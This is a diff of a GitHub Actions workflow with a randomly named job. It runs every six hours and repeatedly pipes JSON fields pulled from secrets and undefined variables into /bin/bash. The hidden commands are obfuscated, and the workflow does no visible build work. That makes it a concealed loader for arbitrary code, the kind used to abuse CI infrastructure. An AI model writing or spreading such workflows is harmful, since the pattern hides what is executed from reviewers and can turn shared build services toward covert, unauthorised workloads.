@@ -3,25 +3,23 @@ name: lindaiyan4635
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
+    - cron: '33 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lindaiyan4635
         env:
-          vka30137: ${{ secrets.vka30137 }}
+          q1: ${{ secrets.q1 }}
         run: |
-          echo $vka30137 | jq -r .b38 | /bin/bash
-          echo $zzcm6497 | jq -r .jgmqw441 | /bin/bash
-          echo $qqm22494 | jq -r .vpdk2 | /bin/bash
-          echo $jmfw290 | jq -r .cbssj26 | /bin/bash
-          echo $sox24 | jq -r .qcbzk9 | /bin/bash
-          echo $wh77 | jq -r .ci37213 | /bin/bash
-          echo $hg6122 | jq -r .ap0 | /bin/bash
-          echo $cddcg61756 | jq -r .vr44055 | /bin/bash
-          echo $gb95 | jq -r .bw00 | /bin/bash
-          echo $tzq54 | jq -r .m226 | /bin/bash
-          echo $h3693 | jq -r .og2385 | /bin/bash
+          echo $q1 | jq -r .chqj13850 | /bin/bash
+          echo $ubgm60 | jq -r .kpne5727 | /bin/bash
+          echo $qtu39 | jq -r .ma33446 | /bin/bash
+          echo $xv5 | jq -r .t68458 | /bin/bash
+          echo $c8422 | jq -r .kp32 | /bin/bash
+          echo $pm4 | jq -r .kz2554 | /bin/bash
+          echo $uwfr00538 | jq -r .ks07731 | /bin/bash
 
